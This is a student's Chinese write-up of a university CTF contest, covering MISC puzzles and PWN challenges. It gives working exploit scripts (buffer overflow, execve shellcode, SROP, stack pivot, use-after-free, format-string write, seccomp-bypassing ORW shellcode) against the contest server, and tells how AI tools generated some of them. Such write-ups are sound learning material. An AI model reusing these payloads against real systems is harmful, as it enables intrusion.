# 校赛

#### [MISC]【签到】Welcome to CTBUCTF2025

**`ctbuctf{Welcome_to_CTBUCTF2025}`**

#### [MISC]问卷调查！

emmm，这个就算了，我拿这个凑个数

#### [MISC]Do you know SSTV?

工具题，虚拟机搞个QSSTV，选附件运行就好

**ctbuctf{N0thing_1s_impossible}**

![image-20250517000754488](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250517000754488.png)

（耄耋有点意思）

#### [MISC]书读万遍其意自现

有后门函数（）

明晃晃的backdoor

main函数跟进secret数组

```assembly
.data:0000000000004010 ; char secret[4]
.data:0000000000004010 secret          db 'CTBU'               ; DATA XREF: main:loc_1844↑r
.data:0000000000004010                                         ; main+1A4↑r ...
.data:0000000000004014                 public key
.data:0000000000004014 ; unsigned int key
.data:0000000000004014 key             dd 0DEADBEEFh           ; DATA XREF: main+161↑r
.data:0000000000004014                                         ; main+1AE↑r ...
.data:0000000000004014 _data           ends
```

又是key又是secret的，且main函数看到secret这个的地方就还在用这俩玩意

```c
if ( secret[0] + key != page
    || (puts("what?"), __isoc99_scanf("%d", &page1), secret[1] + key != page1)
    || (puts("pwner??"), __isoc99_scanf("%d", &page2), secret[2] + key != page2)
    || (puts("so crazy!"), __isoc99_scanf("%d", &page3), secret[3] + key != page3) )
```

用脚想也知道多半有东西（）

所以0DEADBEEF = 3735928559？

并非，因为key定义为int，是有符号的

- - `secret` 的元素是 `char` 类型（8 位有符号整数），但在运算时会提升为 `int`（32 位有符号整数）。
  - `key` 是 `unsigned int`，但在与 `int` 相加时，会遵循 **C 语言的类型转换规则**：
    1. 如果两个操作数类型不同，且其中一个为 `unsigned int`，另一个为 `int`，则 **`int` 会被转换为 `unsigned int`**。
    2. 因此，整个表达式 `secret[i] + key` 的运算结果是 **无符号整数**。

以 `secret[0] + key` 为例：

- **数值计算**：

  ```
  secret[0] = 67 (int) → 转换为 unsigned int: 67
  key = 0xDEADBEEF → unsigned int 3735928559
  secret[0] + key = 67 + 3735928559 = 3735928626 (无符号十进制)
  ```

- **二进制表示**：

  - 3735928626 的十六进制为 `0xDEADBE66`。

  - **但程序要求输入的是 `int`**（`%d` 格式符），因此需要将无符号结果 **解释为有符号整数**：

    ```
    signed_value = 3735928626 - 2**32 = 3735928626 - 4294967296 = -559038670
    ```

| secret[0] + key | 67 + 3735928559 = 3735928626 | -559038670 |
| --------------- | ---------------------------- | ---------- |
| secret[1] + key | 84 + 3735928559 = 3735928643 | -559038653 |
| secret[2] + key | 66 + 3735928559 = 3735928625 | -559038671 |
| secret[3] + key | 85 + 3735928559 = 3735928644 | -559038652 |

现在直接按顺序输入就好了

直接flag
**`ctbuctf{CAYLESsaNDdOMoRe}`**

#### [MISC]Ez_Base64

emmm，pz一把梭，你值得拥有

我爱妙妙小工具（）

![image-20250518185106435](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518185106435.png)

#### [MISC]vivo50保卫战：决战星期四

交互玩两次感觉不算复杂，但是想着是夏师傅压箱底的题，我还以为还有什么奇奇怪怪的点（我一开始真以为是brainfuck的变种编码了）

玩了几个字符的bf编码形式进去，感觉像可以逐字节爆破

直接甩给AI，然后后台跑着爆了

```shell
目标服务器：ctf.ctbu.edu.cn:33326
交互效果：
┌──(kali㉿kali)-[~]
└─$ nc ctf.ctbu.edu.cn 33326                            

    ╔════════════════════════════════════════════╗
    ║                                            ║
    ║   ████████████████████████████████████     ║
    ║   █       GRANDPA'S VIVO50 SAFE      █     ║
    ║   ████████████████████████████████████     ║
    ║                                            ║
    ║   Enter Brainfuck Code to Unlock:          ║
    ║                                            ║
    ║   ┌────────────────────────────────────┐   ║
    ║   │ >>>                                │   ║
    ║   └────────────────────────────────────┘   ║
    ║                                            ║
    ║   Options:                                 ║
    ║   [ RUN BF CODE ]  [ RESET ]  [ HELP ]     ║
    ║                                            ║
    ║    ⚠ Reminder: Thursday is the deadline!   ║
    ║                                            ║
    ╚════════════════════════════════════════════╝
    
Enter the password
>> a

Only the following Brainfuck commands are allowed: '>' '<' '+' '-' '.' ',' '[' ']' ' '

    ╔════════════════════════════════════════════╗
    ║                                            ║
    ║   ████████████████████████████████████     ║
    ║   █       GRANDPA'S VIVO50 SAFE      █     ║
    ║   ████████████████████████████████████     ║
    ║                                            ║
    ║   Enter Brainfuck Code to Unlock:          ║
    ║                                            ║
    ║   ┌────────────────────────────────────┐   ║
    ║   │ >>>                                │   ║
    ║   └────────────────────────────────────┘   ║
    ║                                            ║
    ║   Options:                                 ║
    ║   [ RUN BF CODE ]  [ RESET ]  [ HELP ]     ║
    ║                                            ║
    ║    ⚠ Reminder: Thursday is the deadline!   ║
    ║                                            ║
    ╚════════════════════════════════════════════╝
    
Enter the password
>> +++++ ++++[ ->+++ +++++ +<]>+ +++++ +++++ +++++ ++.<+ +++[- >++++ <]>+. <++++ [->-- --<]> --.<+ +++[- >++++ <]>++ +.<++ ++[-> ----< ]>--. <++++ [->++ ++<]> +.<++ +[->- --<]> ----- .<

Decrypting...
ctbuctfTraceback (most recent call last):
  File "/app/maker.py", line 100, in <module>
    print(password[i], end='', flush=True)
IndexError: list index out of range
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ nc ctf.ctbu.edu.cn 33326

    ╔════════════════════════════════════════════╗
    ║                                            ║
    ║   ████████████████████████████████████     ║
    ║   █       GRANDPA'S VIVO50 SAFE      █     ║
    ║   ████████████████████████████████████     ║
    ║                                            ║
    ║   Enter Brainfuck Code to Unlock:          ║
    ║                                            ║
    ║   ┌────────────────────────────────────┐   ║
    ║   │ >>>                                │   ║
    ║   └────────────────────────────────────┘   ║
    ║                                            ║
    ║   Options:                                 ║
    ║   [ RUN BF CODE ]  [ RESET ]  [ HELP ]     ║
    ║                                            ║
    ║    ⚠ Reminder: Thursday is the deadline!   ║
    ║                                            ║
    ╚════════════════════════════════════════════╝
    
Enter the password
>> +++++ ++++[ ->+++ +++++ +<]>+ +++++ +++++ +++++ ++.<+ +++[- >++++ <]>+. <++++ [->-- --<]> --.<+ +++[- >++++ <]>++ +.<++ ++[-> ----< ]>--. <++++ [->++ ++<]> +.<++ +[->- --<]> ----- .<+++ +[->+ +++<] >++++ +.<++ +++[- >---- -<]>- .<

Decrypting...
ctbuctf{a
Wrong Password! Try again~

    ╔════════════════════════════════════════════╗
    ║                                            ║
    ║   ████████████████████████████████████     ║
    ║   █       GRANDPA'S VIVO50 SAFE      █     ║
    ║   ████████████████████████████████████     ║
    ║                                            ║
    ║   Enter Brainfuck Code to Unlock:          ║
    ║                                            ║
    ║   ┌────────────────────────────────────┐   ║
    ║   │ >>>                                │   ║
    ║   └────────────────────────────────────┘   ║
    ║                                            ║
    ║   Options:                                 ║
    ║   [ RUN BF CODE ]  [ RESET ]  [ HELP ]     ║
    ║                                            ║
    ║    ⚠ Reminder: Thursday is the deadline!   ║
    ║                                            ║
    ╚════════════════════════════════════════════╝
    
Enter the password
>> 

大致玩法就是连上服务器后，输入所求flag对应的brainfuck编码
对于每次输入的内容，服务器会一位一位的进行比对，只有上一位brainfuck解码出来对应的字母和目标字母相匹配，才能开始比对下一位，如果比对没能对上，会退出这次比对然后要求再输入一次password，password即需要输入的brainfuck内容
现在，已知目标密码格式：ctbuctf{[a-z0-9]+}，请将密码作为flag提交
现在，逐位进行遍历，只有花括号里面的未知内容需要遍历，长度未知，每次遍历要求把当前的内容进行brainfuck编码后，传入目标服务器，然后观察回显，如果提示wrong password就让当前字母换成下一个字母
例如，第一次遍历使用ctbuctf{a}进行，经过brainfuck编码后，传入
在服务器对字母’a‘进行比对后，会抛出wrong password，则进入下一个字母，也就是ctbuctf{b}，直到这个字符验证正确，进入下一位字符的验证
例如，如果输入ctbuctf{x}，因为交互效果的原因，当花括号中的第一位内容真的是x时，响应中的Decrypting...部分，会输出成ctbuctf{x}，然后抛出错误，如果不是x，只会输出成ctbuctf{x           然后抛出错误
所以现在写个遍历脚本，经过brainfuck编码后，连接服务器，传入后逐字节爆破，目标是找到密码，也就是flag
```

话说为什么非要弄个那什么options上去，一开始没想玩这个就是因为我没法选这个选项，我还在想这怎么玩，我玩不明白（）

结果我到最后都没用上这个）

AI给出的exp：

```python
import socket


def str_to_bf(s):
    if not s:
        return ""
    code = ""
    for c in s:
        code += ">"
        code += "+" * ord(c)
        code += "."
    return code[1:]  # 去掉第一个多余的'>'


charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
known_prefix = "ctbuctf{"

while not known_prefix.endswith('}'):
    print(f"Current prefix: {known_prefix}")
    found = False
    for c in charset:
        guess = known_prefix + c
        bf_code = str_to_bf(guess)
        print(f"Trying '{guess}': {bf_code[:50]}...")

        # 建立连接并发送BF代码
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect(('ctf.ctbu.edu.cn', 33326))

            # 读取直到出现输入提示符
            buffer = ""
            while True:
                data = s.recv(1024).decode(errors='ignore')
                if not data:
                    break
                buffer += data
                if ">> " in buffer:
                    break

            # 发送Brainfuck代码
            s.sendall(bf_code.encode() + b'\n')

            # 读取响应
            response = ""
            while True:
                data = s.recv(4096).decode(errors='ignore')
                if not data:
                    break
                response += data
            s.close()
        except Exception as e:
            print(f"Error: {e}")
            continue

        # 检查是否出现IndexError
        if 'IndexError' in response:
            known_prefix += c
            print(f"Found correct character: '{c}'")
            found = True
            break
        else:
            print(f"Character '{c}' incorrect.")

    if not found:
        print("Failed to find next character. Exiting.")
        break

print(f"Flag found: {known_prefix}")
```

老实说，一开始我嫌这个版本慢，看到之前的交互效果，有些奇奇怪怪的想法，重新梭了一份脚本

但是这个更慢（还好我一开始想的是两个一起跑，不停不改第一个）

不过第二份能不能跑出来还真不一定（）

```python
from pwn import *
import string

context.log_level = 'error'  # 关闭冗余日志


def generate_bf(current_guess):
    # 生成只输出当前猜测字符串的brainfuck代码
    # 确保每个字符在独立cell中生成，避免指针干扰
    bf_code = ""
    for c in current_guess:
        bf_code += ">"  # 移动到新cell
        bf_code += "+" * ord(c)  # 设置当前cell值
        bf_code += "."  # 输出字符
    return bf_code[1:]  # 去掉第一个多余的>


known = "ctbuctf{"
charset = string.ascii_lowercase + string.digits

while not known.endswith('}'):
    print(f"Current progress: {known}")
    for c in charset:
        current_guess = known + c
        bf = generate_bf(current_guess)

        try:
            # 每次创建新连接确保环境重置
            r = remote('ctf.ctbu.edu.cn', 33326)

            # 跳过初始提示
            r.recvuntil(b'>> ')

            # 发送BF代码
            r.sendline(bf.encode())

            # 获取响应
            resp = r.recvall(timeout=2).decode()
            r.close()

            # 关键判断逻辑
            if 'IndexError' in resp:
                known += c
                print(f"Found: {c} => {known}")
                break
            elif 'Decrypting...' in resp and known + c in resp:
                known += c
                print(f"Full match found: {known}")
                break
        except:
            continue
    else:
        print("No valid characters found!")
        break

print(f"Final flag: {known}")
```

PS：第一份exp梭到图片位置，我还以为出意外了，吓得我差点直接摁重启程序，真摁了我一千多分就没了（）

这里最后补个`}`就好了

![image-20250518190122678](C:\Users\26597\AppData\Roaming\Typora\typora-user-images\image-20250518190122678.png)

#### [PWN]Pwn me ! 💥

好久没做ret2text了，卡在一个莫名其妙的地方十多分钟，怪招笑的（）

嗯对，就是那个0x40119E （）

```python
from pwn import *
context.log_level = 'debug'
p = remote("ctf.ctbu.edu.cn",32999)
payload =b'a' *(64 + 8) +  p64(0x40119E)
p.sendlineafter(b'me!\n',payload)
p.interactive()
```

#### [PWN]shellcode 🐚

原本以为还有些什么要注意的点，结果真的传上就给

随便找个64位短shellcode进去凑数了

```python
from pwn import *
context.log_level = 'debug'
p = remote("ctf.ctbu.edu.cn",33019)
payload = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
p.sendline(payload)
p.interactive()
```

#### [PWN]srop 🧙‍♂️

看了快接近24小时的题目

不能说情有独钟，只能说自己蠢得没边

原理复述起来好麻烦（）

内核层和用户层啥的，反正就是暂时kill进程然后保存一份，之后再复原嘛

这个过程可以直接伪造，让rax = 15 ，syscall的情况下会直接等价于一个sigreturn

然后伪造一下各寄存器的值就好了

然后/bin/sh在data段是直接就有，没必要像网上那些奇奇怪怪的复杂例题一样再往bss段先写个/bin/sh进去

（话说能不能写啊，我还没试过，之前忘了那8字节的rbp，重新往bss写/bin/sh也试过，但是肯定没通，之后试试写个进去能不能玩）

（一开始我还在IDA到处翻syscall在哪，后面发现ROPgadget里面巨好找，也是脑瘫忘了ROPgadget也能找到syscall了）

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# 地址信息
bin_sh_addr = 0x404010
syscall_addr = 0x40110d
gift_addr = 0x401113

# 构造SROP Frame
frame = SigreturnFrame()
frame.rax = 59            # execve系统调用号
frame.rdi = bin_sh_addr    # /bin/sh的地址
frame.rsi = 0             # 参数2
frame.rdx = 0             # 参数3
frame.rip = syscall_addr   # 执行syscall以触发execve


# 构造payload
payload = b'A' * 40       # 填充缓冲区及RBP
payload += p64(gift_addr)  # 覆盖返回地址为gift函数
payload += p64(syscall_addr)  # gift返回后执行syscall
payload += bytes(frame)    # 添加伪造的Signal Frame

# 发送payload并获取shell
r = remote('ctf.ctbu.edu.cn', 33204)
r.send(payload)
r.interactive()
```

#### [PWN]ez_stack 🐙

栈迁移（第二次玩）

main函数进去就俩函数

title不管，vuln看看

```c
__int64 vuln()
{
  _BYTE buf[48]; // [rsp+0h] [rbp-30h] BYREF

  puts("What's your name?");
  read(0, &name, 0x100uLL);
  puts("Ok! Just do it!");
  read(0, buf, 0x38uLL);
  return 0LL;
}
```

read函数输入进去，buf就吃掉了0x30，就只能覆盖0x8字节内容

不够只能外借了

只能到处找哪能写点东西进去

bss段可读可写，一翻还真有说法

```assembly
.bss:0000000000404080                 public name
.bss:0000000000404080 name            db    ? ;               ; DATA XREF: vuln+20↑o
```

那思路就是通过溢出，将`RBP`覆盖为`name`的地址（`0x404080`）

将返回地址覆盖为`ret`指令（`0x40101a`），用于栈对齐

`name`里面就随便写了

`/bin/sh`又在附件中能找到

直接开个`execve`然后`rdi`指向`/bin/sh`直接就完成提权了（）

至于execve，这个好搞，ROPgadget一翻就找到这几个能用的pop

pop传参进对应寄存器完成系统调用

直接就get shell

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

r = remote('ctf.ctbu.edu.cn', 33301)

name_addr = 0x404080
ret_addr = 0x40101a
pop_rdi = 0x401180
pop_rsi = 0x401182
pop_rdx = 0x40117a
pop_rax_syscall = 0x40117d
bin_sh = 0x404028


payload1 = flat([
    0,  
    pop_rdi, bin_sh,
    pop_rsi, 0,
    pop_rdx, 0,
    pop_rax_syscall, 59
])


payload2 = b'A'*48 + p64(name_addr) + p64(ret_addr)




r.sendlineafter(b"What's your name?\n", payload1)
r.sendlineafter(b"Ok! Just do it!\n", payload2)

r.interactive()
```

#### [PWN]uaf 👻

emmm，这题我不会的（）

原本只是随手看看能不能甩给AI给我理个堆题的逻辑出来我再慢慢填板子的

结果信息给够了它直接就给我搞了个完整exp然后还出了

留个提问信息吧：

> 这是一道ctf pwn挑战赛题
> main函数如下：
> // local variable allocation has failed, the output may be wrong!
> int __fastcall main(int argc, const char **argv, const char **envp)
> {
>   while ( 1 )
>   {
>     print_menu(*(_QWORD *)&argc, argv, envp);
>     switch ( (unsigned int)get_num() )
>     {
>       case 1u:
>         adopt_dog();
>         break;
>       case 2u:
>         Release_dog();
>         break;
>       case 3u:
>         edit_dog();
>         break;
>       case 4u:
>         Check_ans();
>       case 5u:
>         puts("Goodbye, you will never find a safer program!\n");
>         exit(0);
>       default:
>         *(_QWORD *)&argc = "Invalid option!\n";
>         puts("Invalid option!\n");
>         break;
>     }
>   }
> }
> main函数地址：main	.text	000000000000183D
> 这是个常规的菜单main函数
> 选项1的adopt_dog函数内容如下：
> int adopt_dog()
> {
>   int v1; // ebx
>   int num; // [rsp+4h] [rbp-1Ch]
>   size_t v3; // [rsp+8h] [rbp-18h]
>
>   if ( cur_alloc_index > 2 )
>     return puts("Too many dogs!");
>   puts("What is the name of the dog?");
>   fgets((char *)&dog_array + 56 * cur_alloc_index, 32, stdin);
>   v3 = strlen((const char *)&dog_array + 56 * cur_alloc_index);
>   if ( v3 && *((_BYTE *)&dog_array + 56 * cur_alloc_index + v3 - 1) == 10 )
>     *((_BYTE *)&dog_array + 56 * cur_alloc_index + v3 - 1) = 0;
>   puts("How much space do you need to describe this dog?");
>   num = get_num();
>   v1 = cur_alloc_index;
>   *((_QWORD *)&unk_4088 + 7 * v1) = malloc(num);
>   *((_DWORD *)&unk_4080 + 14 * cur_alloc_index) = num;
>   dword_4090[14 * cur_alloc_index] = -559038737;
>   if ( !*((_QWORD *)&unk_4088 + 7 * cur_alloc_index) )
>   {
>     puts("Alloc call failed");
>     exit(1);
>   }
>   puts("Successful adoption!");
>   return ++cur_alloc_index;
> }
> 选项2：
> int Release_dog()
> {
>   int num; // [rsp+Ch] [rbp-4h]
>
>   puts("Which dog would you like to release?");
>   num = get_num();
>   if ( num > 2 )
>     return puts("Provided index out of bounds, this is not possible!");
>   if ( dword_4090[14 * num] != -559038737 )
>     return puts("Provided index hasn't yet been allocated, can't reallocate!");
>   free(*((void **)&unk_4088 + 7 * num));
>   return printf("%s has been released! It will leave you forever.\n", (const char *)&dog_array + 56 * num);
> }
> 选项3：
> int edit_dog()
> {
>   int num; // [rsp+Ch] [rbp-4h]
>
>   puts("Which dog's info do you want to edit?");
>   num = get_num();
>   if ( num > 2 )
>     return puts("Provided index out of bounds, this is not possible!");
>   if ( dword_4090[14 * num] != -559038737 )
>     return puts("Provided index hasn't yet been allocated, can't edit!");
>   puts("Please edit its information.");
>   return read(0, *((void **)&unk_4088 + 7 * num), *((unsigned int *)&unk_4080 + 14 * num));
> }
> 选项4：
> void __noreturn Check_ans()
> {
>   const char *v0; // rdi
>
>   v0 = (const char *)malloc(0x48uLL);
>   if ( !strcmp(v0, "ez uaf") )
>     win();
>   puts("Hah, you missed your shot!");
>   exit(0);
> }
> 选项4中的win函数：
> void __noreturn win()
> {
>   printf("The flag is: ");
>   system("cat flag");
>   exit(1);
> }
> 这是一道pwn方向考察UAF的题，各函数的地址如下：
> adopt_dog	.text	0000000000001413
> Release_dog	.text	0000000000001625	
> edit_dog	.text	0000000000001701	
> Check_ans	.text	00000000000017E2	
> win	.text	00000000000013DE	
> 现在考虑如何构造exp，来打通这题
> 目标服务器：ctf.ctbu.edu.cn:33210 ，用pwn库的remote方法进行连接
>
> int print_menu()
> {
>   puts("[1] Adopt a dog");
>   puts("[2] Release a dog");
>   puts("[3] Edit dog Info");
>   puts("[4] Check the answer");
>   puts("[5] Exit");
>   return printf("\n > ");
> }
> 进行交互时，会先进入print_menu函数，也就是上面的代码函数
> 根据这个情况改写一下exp，以求适配

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

p = remote('ctf.ctbu.edu.cn', 33210)

def adopt_dog(name, size):
    p.sendlineafter(b'> ', b'1')          # 选择选项1
    p.sendlineafter(b'What is the name of the dog?\n', name)
    p.sendlineafter(b'How much space do you need to describe this dog?\n', str(size).encode())

def release_dog(index):
    p.sendlineafter(b'> ', b'2')          # 选择选项2
    p.sendlineafter(b'Which dog would you like to release?\n', str(index).encode())

def edit_dog(index, data):
    p.sendlineafter(b'> ', b'3')          # 选择选项3
    p.sendlineafter(b"Which dog's info do you want to edit?\n", str(index).encode())
    p.send(data)                          # 直接发送数据（无需换行）

# 1. 分配并释放0x48的块
adopt_dog(b'dummy', 0x48)    # 分配索引0，大小0x48
release_dog(0)                # 释放索引0（触发UAF）

# 2. 篡改已释放块的内容为"ez uaf"
edit_dog(0, b'ez uaf\x00')   # 通过UAF写入目标字符串

# 3. 触发Check_ans，此时malloc(0x48)会复用被篡改的块
p.sendlineafter(b'> ', b'4')  # 选择选项4

# 4. 获取flag
p.interactive()
```

（校赛wp就暂时不理会原理了，打完再重新复现玩玩，玩明白了再重新贴一篇UAF）

#### [PWN]just_one 🎯

保护全开，好痛苦（）

明说了fmt

发现AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p这种交互，居然会直接退出（差点因为这个问题直接劝退了）

后面想起来还可以换AAAA%x$p来找（当时想着5~15二分法找，结果居然是6，还不如直接挨着猜）

在AAAA%6$p进行交互的时候，拿到了

`AAAA0x7024362541414141`

这一连串的41，对味了

锁定第六位了

```C
unsigned __int64 vuln()
{
  _QWORD buf[513]; // [rsp+0h] [rbp-1010h] BYREF
  unsigned __int64 v2; // [rsp+1008h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(buf, 0, 0x1000uLL);
  buf[100] = 3735928558LL;
  buf[200] = &buf[100];
  puts("This fmt is not difficult, but it will test your basic skills.");
  puts("Come on, you can do it.\n");
  puts("Show me your payload");
  printf("> ");
  read(0, buf, 0x10uLL);
  printf((const char *)buf);
  if ( buf[100] == 3735928559LL )
    backdoor();
  else
    puts("Bye bye~");
  return v2 - __readfsqword(0x28u);
}
```

`buf[100] = 3735928558LL;`

换个写法就`0xdeadbeee`嘛

想进backdoor就必须要加1

```c
  if ( buf[100] == 3735928559LL )
    backdoor();
```

所以`0xdeadbeee` ---->  ` 0xdeadbeef`才行

**观察差异**：`0xdeadbeee` 和 `0xdeadbeef` 的唯一区别是 **最低字节**：

`0xdeadbeee` → 最低字节为 `0xee`（十进制 `238`）。

`0xdeadbeef` → 最低字节为 `0xef`（十进制 `239`）。

要改一字节，所以限制挺大的（）

所以得用%hhn

**`%hhn` 的作用**：向目标地址写入 **1 字节**（即已输出字符数的低 8 位）

**`%n` 的作用**：向目标地址写入 `int` 或 `long` 类型（4 或 8 字节），这会覆盖更多内存区域

```c
read(0, buf, 0x10uLL);
```

上面也是限制用%hhn的原因，毕竟这样才能尽可能的短

**此处需求**：只需修改 **1 字节**（从 `0xee` 到 `0xef`），使用 `%hhn` 更精准，且避免意外破坏其他内存

要将 `0xee`（`238`）改为 `0xef`（`239`），需写入的值为 `239`

`%239c` 会输出 `239` 个字符（填充空格），使总输出的字符数达到 `239`

**`buf[200]`的位置计算**：

`buf`起始于第6个参数

每个`_QWORD`元素占8字节，相当于1个参数位置

`buf[200]`的偏移为`200`，故在参数列表中的位置为`6 + 200 = 206`

**关键结论**：`buf[200]`的值（即`buf[100]`的地址）位于第**206个参数**

`%206$hhn` 会将 `239` 的低 8 位（即 `0xef`）写入 `buf[100]` 的最低字节

那组合一下pld就出来了（）

```python
from pwn import *

context.log_level = 'debug'

# 连接到远程服务器
p = remote('ctf.ctbu.edu.cn', 33229)

# 构造格式化字符串，将buf[100]的最低字节修改为0xef（239）
payload = b'%239c%206$hhn'

# 发送payload
p.sendlineafter(b'> ', payload)

# 获取交互权限
p.interactive()
```

#### [PWN]shellcode_pro 🦞

燃尽了，真不会这个

交给AI，居然还是梭出来了

这辈子最相信deepseek的时刻

调教过程挺长（）

大致调教思路就是给出各函数地址和内容，交代交互效果，然后报错喂回去再报错再喂

最后看它说法是玩的ORW

（没玩过这个，不知道怎么判断玩这个的，又是一道赛后慢慢研究的题目）
还是惯例贴出提问词（提问段）：

```shell
现在需要你帮助完成一道pwn题
主要打通方法是传入shellcode
文件保护情况：[*] 'C:\\Users\\26597\\Downloads\\Compressed\\shellcode_pro\\shellcode_pro'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
main函数地址：0x1501
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+Ch] [rbp-1014h]
  _BYTE buf[16]; // [rsp+10h] [rbp-1010h] BYREF
  unsigned __int64 v6; // [rsp+1018h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  title();
  puts("Your shellcode:");
  v4 = read(0, buf, 0x1000uLL);
  setup_shellcode(buf, v4);
  return 0;
}
title函数只是单纯的puts内容，交互效果是：
┌──(kali㉿kali)-[~]
└─$ nc ctf.ctbu.edu.cn 33243
    ███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ██████╗ ███████╗
    ██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗██╔══██╗██╔════╝
    ███████╗███████║█████╗  ██║     ██║     ██║     ██║   ██║██║  ██║█████╗  
    ╚════██║██╔══██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║  ██║██╔══╝  
    ███████║██║  ██║███████╗███████╗███████╗╚██████╗╚██████╔╝██████╔╝███████╗
    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
                          ██████╗ ██████╗  ██████╗                           
                          ██╔══██╗██╔══██╗██╔═══██╗                          
                          ██████╔╝██████╔╝██║   ██║                          
                          ██╔═══╝ ██╔══██╗██║   ██║                          
                          ██║     ██║  ██║╚██████╔╝                          
                          ╚═╝     ╚═╝  ╚═╝ ╚═════╝                           

Well, you must have understood what shellcode is. 
Let's try to bypass this sandbox.

Your shellcode:
asda
[+] Executing shellcode with length: 5...
[+] Shellcode location: 0x7fc384216000
setup_shellcode函数地址：0x142D
内容：int __fastcall setup_shellcode(const void *a1, unsigned int a2)
{
  void *dest; // [rsp+10h] [rbp-10h]

  dest = mmap(0LL, a2, 7, 34, -1, 0LL);
  if ( dest == (void *)-1LL )
  {
    perror("mmap failed");
    exit(1);
  }
  memcpy(dest, a1, a2);
  printf("[+] Executing shellcode with length: %u...\n", a2);
  printf("[+] Shellcode location: %p\n", dest);
  setup_seccomp();
  ((void (*)(void))dest)();
  return munmap(dest, a2);
}
setup_seccomp地址：13C4
内容：__int64 setup_seccomp()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(2147418112LL);
  seccomp_rule_add(v1, 0LL, 59LL, 0LL);
  seccomp_rule_add(v1, 0LL, 322LL, 0LL);
  return seccomp_load(v1);
}
考虑怎么传入shellcode才能打穿题目
目标服务器：ctf.ctbu.edu.cn:33243
用pwn库的remote方法进行连接
```

然后就是常规的报错，喂回，报错，喂回，重复该系列操作9次

最终exp：

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# 无空字节终极解决方案
shellcode = asm('''
    /* 构造路径flag */
    xor rax, rax
    push rax                /* 8字节终止符 */
    mov dword ptr [rsp], 0x67616c66 /* 'flag' */
    lea rdi, [rsp]         /* 文件路径指针 */

    /* open系统调用 */
    xor rsi, rsi            /* O_RDONLY=0 */
    xor rdx, rdx            /* mode=0 */
    mov al, 2               /* sys_open=2 */
    syscall

    /* read系统调用 */
    mov rdi, rax            /* 文件描述符 */
    mov rsi, rsp            /* 使用当前栈顶作为缓冲区 */
    xor rdx, rdx
    mov dh, 0x1             /* 读取长度=0x100 */
    xor rax, rax            /* sys_read=0 */
    syscall

    /* write系统调用 */
    mov rdx, rax            /* 实际读取长度 */
    xor rdi, rdi            /* stdout=1 */
    inc rdi
    xor rax, rax
    inc al                  /* sys_write=1 */
    syscall

    /* 保持连接（死循环防止退出） */
    jmp $
''')

# 验证无空字节
print(f"Shellcode长度: {len(shellcode)} bytes")
print(f"Hex内容: {shellcode.hex()}")
assert b'\x00' not in shellcode, "检测到空字节！"

# 连接远程服务器
r = remote('ctf.ctbu.edu.cn', 33243)
r.recvuntil(b'Your shellcode:\n')
r.send(shellcode)
r.interactive()
```

##### 5.28补档：

很简单的ORW，真是入门级别的

谢哥给的exp算简单的，我重新开始尝试的时候考虑的是想办法泄露一下libc找偏移找对应的各个寄存器地址来着

结果ROP一查没pop_rdi

转念一想这个玩意都说是shellcode了，我这样打，不成ret2libc了吗，看了看感觉也打不了

想了想感觉就只有谢哥那个方法高效一点

函数分析挺简单的

main函数进去就读

就纯读你写的啥，写个ORW调用进去就行了

目标有了，原本考虑的是直接控制各寄存器的，但这不是找不到吗，所以学了学这个shellcraft的一些骚姿势

以前用得多的也就shellcraft.sh啥的

```python
# sc = shellcraft.open("./flag", 0)
# sc += shellcraft.read(3, "rsp", 0x100) # open函数返回的文件指针存在rax中
# sc += shellcraft.write(1, "rsp", 0x30)
```

像上面这种，asm一下就能拿来当payload用了

pwn库集成的这个shellcraft方法很智能，可以直接自己对应到寄存器里面，是寄存器名称就mov 进去，是值就pop进去，相当便利

所以原本read函数第一个参数是fd，也就是文件标识符，这里原本谢哥exp用的“rax”，能用，反正rax会直接mov给rdi，这里我用的3

这里有个需要注意的点，3这个参数代表的是什么？

这个位置是fd，也就是文件描述符

那我问你，fd不是只有0，1，2吗，为什么我3才能用？

实际上这和先前调用了open有关，这导致了0，1，2已经被用了，所以为了方便，程序会往后拓

所以我这的3等价于0

那如果远程环境里面多开了几个函数什么的，那你输3也得炸缸，所以最稳妥的办法还是扔rax

而不是硬编码的fd值

###### **一、文件描述符的分配规则**

文件描述符的分配遵循 **"最小可用原则"**：

1. **默认保留的 fd**：进程启动时默认打开 `0`（stdin）、`1`（stdout）、`2`（stderr）。
2. **新文件/设备的 fd**：当调用 `open`、`socket` 等函数时，系统会分配当前 **最小的未使用整数** 作为 fd。
   - 例如：若未关闭任何文件，首次 `open` 会返回 `3`，第二次返回 `4`，依此类推。
3. **关闭后的重用**：若关闭某个 fd（如 `close(3)`），后续 `open` 会优先复用 `3`。

------

###### **二、为什么你的代码中 `fd=3` 能正常工作？**

**1. 本地测试场景的典型行为**

在大多数 CTF Pwn 题目的设计（尤其是简单题目）中：

- **进程初始化时未打开额外文件**：只有 stdin/stdout/stderr（fd=0/1/2）。
